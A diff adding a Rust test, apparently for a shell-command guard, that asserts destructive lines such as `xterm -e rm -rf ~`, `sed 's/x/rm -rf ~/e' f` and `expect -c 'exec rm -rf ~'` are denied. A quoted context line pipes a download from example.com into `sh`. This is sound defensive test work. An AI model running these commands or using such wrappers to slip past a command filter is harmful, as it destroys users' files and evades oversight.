@@ -264,3 +264,47 @@ fn a_pattern_flag_value_is_not_a_shell_line() {
         "osascript -e 'do shell script \"curl -s https://example.com/p | sh\"'",
     ]);
 }
+
+/// A program that runs the value of its `-e` or `-c` is read as the
+/// command it runs: a terminal emulator's `-e` (`--`, `-x`, `--command`),
+/// GNU sed's `e` command and `s///e` flag, and `expect -c` (Tcl's `exec`,
+/// `spawn`). Measured 2026-11-21 against main fa63f83: each line below was
+/// allowed while `watch 'rm -rf ~'` was refused (BI
+/// NEW-20261119-guard-code-flag-programs-sed-expect-xterm).
+#[test]
+fn a_terminal_sed_or_expect_runs_the_command_it_is_handed() {
+    for line in [
+        "xterm -e rm -rf ~",
+        "xterm -hold -e 'rm -rf ~'",
+        "gnome-terminal -- rm -rf ~",
+        "gnome-terminal --command='rm -rf ~'",
+        "konsole -e 'rm -rf ~'",
+        "alacritty -e sh -c 'rm -rf ~'",
+        "sed '1e rm -rf ~' f",
+        "sed -n 'e rm -rf ~' f",
+        "sed 's/x/rm -rf ~/e' f",
+        "sed --expression='1e rm -rf ~' f",
+        "sed --expression '1e rm -rf ~' f",
+        "sed -ne 'p;$e rm -rf ~' f",
+        "sed '/foo/e rm -rf ~' f",
+        "expect -c 'spawn rm -rf ~'",
+        "expect -c 'exec rm -rf ~'",
+    ] {
+        assert_eq!(verdict(line), "deny", "{line}");
+    }
+    assert_allowed(&[
+        "xterm",
+        "xterm -e htop",
+        "konsole --workdir ~/work",
+        "sed -n '1,20p' README.md",
+        "sed -i 's/foo/bar/g' src/a.rs",
+        "sed -e 's/a/b/' -e 's/c/d/' f",
+        "sed 's/e/E/g' f",
+        "sed -n '/^fn /p' f",
+        "sed '/^$/d' f",
+        "sed -i.bak -e 's/x/y/' f",
+        "sed -E 's/(a|b)/x/g' f",
+        "sed 's/version = .*/version = \"1\"/' Cargo.toml",
+        "expect script.exp",
+    ]);
+}
